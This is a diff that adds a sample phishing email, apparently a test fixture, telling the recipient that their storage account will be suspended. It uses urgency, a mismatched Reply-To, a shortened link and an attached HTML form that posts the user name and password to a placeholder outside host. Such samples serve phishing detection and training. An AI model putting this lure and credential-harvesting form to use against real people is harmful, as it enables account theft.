@@ -1,0 +1,41 @@
+From: Cloud Storage Team <notice@cloudstorage.example>
+To: li.li@corp.example.com
+Subject: Action required: your account will be suspended
+Date: Fri, 11 Sep 2026 22:15:25 -0000
+Message-ID: <178916492563.37348.12204735015269598935@mail.example.com>
+Authentication-Results: mx.corp.example.com; spf=pass
+ smtp.mailfrom=cloudstorage.example; dkim=none; dmarc=pass
+Return-Path: <notice@cloudstorage.example>
+Reply-To: support-desk@other-mail.invalid
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============0705423004435031637=="
+
+--===============0705423004435031637==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment; filename="account-verify.html"
+
+Dear user,
+
+Your account storage quota has been exceeded. Please verify your account with=
+in 24 hours,
+otherwise the account will be suspended and all files will be deleted.
+
+Click to confirm: https://bit.ly/3xFakeAccountVerify
+
+Cloud Storage Team
+
+--===============0705423004435031637==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+MIME-Version: 1.0
+Content-Disposition: attachment; filename="account-verify.html"
+
+<html><body>
+<h2>Account Verification</h2>
+<form action="http://backup-notice.example.top/verify" method="post">
+<input name="user"><input name="pass" type="password"><button>Verify</button>
+</form></body></html>
+
+--===============0705423004435031637==--
